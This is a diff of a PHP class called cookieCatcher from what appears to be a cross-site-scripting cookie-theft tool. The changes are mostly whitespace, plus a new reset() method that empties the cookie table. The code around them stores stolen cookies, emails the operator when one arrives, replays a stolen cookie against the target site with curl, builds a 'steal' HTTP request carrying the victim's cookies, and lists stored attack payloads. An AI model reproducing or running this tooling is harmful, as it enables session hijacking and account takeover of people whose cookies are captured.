@@ -6,9 +6,9 @@
  * @package classes
  * @copyright Copyright 2013 DisK0nn3cT
 **/
- 
+
 class cookieCatcher extends mysqlQueryLab {
-   
+
   /**
    * Grab and save the cookie
    * @return void
@@ -20,20 +20,29 @@ class cookieCatcher extends mysqlQueryLab {
                 mysql_real_escape_string($url),
                 mysql_real_escape_string($cookie));
     $cookie = $this->execute($query);
-    
+
     // Send email notification
     $this->notify($this->insert_ID());
     return true;
   }
-  
-  /** 
+
+  /**
+   * Resest the cookie table
+   */
+  public function reset() {
+    $query = sprintf("DELETE FROM cookies");
+    $reset = $this->execute($query);
+    return $reset;
+  }
+
+  /**
    * Load the cookie from the dB
    */
   public function view($cookieID=0)
   {
     if($cookieID>0) {
       $query = sprintf("SELECT * FROM cookies WHERE id=%s",
-                (int)$cookieID); 
+                (int)$cookieID);
       $cookies = $this->execute($query);
     } else {
       $query = sprintf("SELECT * FROM cookies");
@@ -42,11 +51,11 @@ class cookieCatcher extends mysqlQueryLab {
     return $cookies;
   }
 
-  /** 
+  /**
    * Refresh the cookie against target
    */
   public function refresh($cookieID)
-  { 
+  {
     $cookie = $this->view($cookieID);
     $ch = curl_init();
     curl_setopt($ch,CURLOPT_URL,$cookie->results[0]['url']);
@@ -59,7 +68,7 @@ class cookieCatcher extends mysqlQueryLab {
     return $result;
   }
 
-  /** 
+  /**
    * Create a cookie payload
    */
   public function steal($cookieID)
@@ -76,9 +85,9 @@ class cookieCatcher extends mysqlQueryLab {
     $p .= "Accept-Encoding: gzip, deflate\r\n";
     $p .= $cookieset;
     $p .= "\r\n\r\n";
-    return $p;    
+    return $p;
   }
-  
+
   /**
    * Send email notification
    */
@@ -92,9 +101,9 @@ class cookieCatcher extends mysqlQueryLab {
     $headers = 'From: cookiecatcher@'.$siteHost."\r\n" .
                'Reply-To: nobody@'.$siteHost."\r\n" .
                'X-Mailer: PHP/' . phpversion();
-    mail($to, $subject, $message, $headers);    
+    mail($to, $subject, $message, $headers);
   }
-  
+
   /**
    * Performs logic to extract cookie data
    */
@@ -104,7 +113,7 @@ class cookieCatcher extends mysqlQueryLab {
         $cookieSet .= trim($cookie)."; ";
       }
     return $cookieSet;
-  } 
+  }
 
   public function payloads() {
     $query = sprintf("SELECT id,name,payload FROM payloads ORDER BY name");
@@ -112,5 +121,5 @@ class cookieCatcher extends mysqlQueryLab {
     return $payloads;
   }
 }
-   
+
 ?>
